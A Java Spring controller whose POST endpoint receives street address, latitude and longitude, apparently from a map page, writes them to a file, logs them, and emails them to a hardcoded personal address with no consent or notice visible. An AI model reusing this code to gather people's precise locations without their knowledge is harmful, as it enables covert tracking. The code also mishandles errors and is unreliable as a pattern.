package C;

import V.MailServer;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.stereotype.Controller;
import org.springframework.util.ResourceUtils;
import org.springframework.web.bind.annotation.*;

import java.io.File;
import java.io.FileOutputStream;
import java.io.FileWriter;
import java.text.SimpleDateFormat;
import java.util.Collections;
import java.util.Date;
import java.util.HashMap;

@Controller
public class ToolIndexController {

    private static final Logger log = LoggerFactory.getLogger(ToolIndexController.class);
    @RequestMapping(value ="/gethello",method = RequestMethod.GET)
    public String gethello(){

        return "index";
    }


    @RequestMapping(value ="/getPosition",method = RequestMethod.GET)
    public String getPosition(){
        return "mapInfo";
    }


    @RequestMapping(value ="/getCacheMax",method = RequestMethod.GET)
    public String cacheMax(){
        return "cachemax";
    }




    /*

     高德地理位置的获取

     */
    @ResponseBody
    @RequestMapping(value ="/postLocation",method = RequestMethod.POST)
    public String postLocation(@RequestParam(value="addreLike",required = false) String addreLike ,
                              @RequestParam(value="street",required = false) String street,
                              @RequestParam(value="streetNumber",required = false) String streetNumber,
                              @RequestParam(value="township",required = false) String township,
                              @RequestParam(value="lat",required = false) String lat,
                              @RequestParam(value="lng",required = false) String lng
    ){
        String reslut ="seccuss";
        FileWriter out=null;
        try {
            String locationStr =addreLike+street+streetNumber+township+"lat:"+lat+"lng:"+lng;
            Date date = new Date();
            SimpleDateFormat  sfd  = new SimpleDateFormat("yyyy-MM-dd HH-mm-ss");
            String stedate = sfd.format(date);
            String path = ResourceUtils.getURL("classpath:").getPath()+stedate;
            File temp = new File(path+"mapInfo.txt");
            temp.createNewFile();
            out  = new FileWriter(temp);
            log.info(temp.getName()+"::"+temp.getAbsolutePath());
            out.write(locationStr);
            out.flush();

            log.info(addreLike+street+streetNumber+township+lat+lng);
            MailServer.sendHtmlMail("missusjy@126.com","postLocationInfo...",locationStr);


        }catch (Exception ex){

            reslut = ex.toString();

        }finally {
            try{
                out.close();
            }catch (Exception ex){
                reslut = ex.toString();
            }

        }
      log.info(reslut);
      return reslut;
    }
}
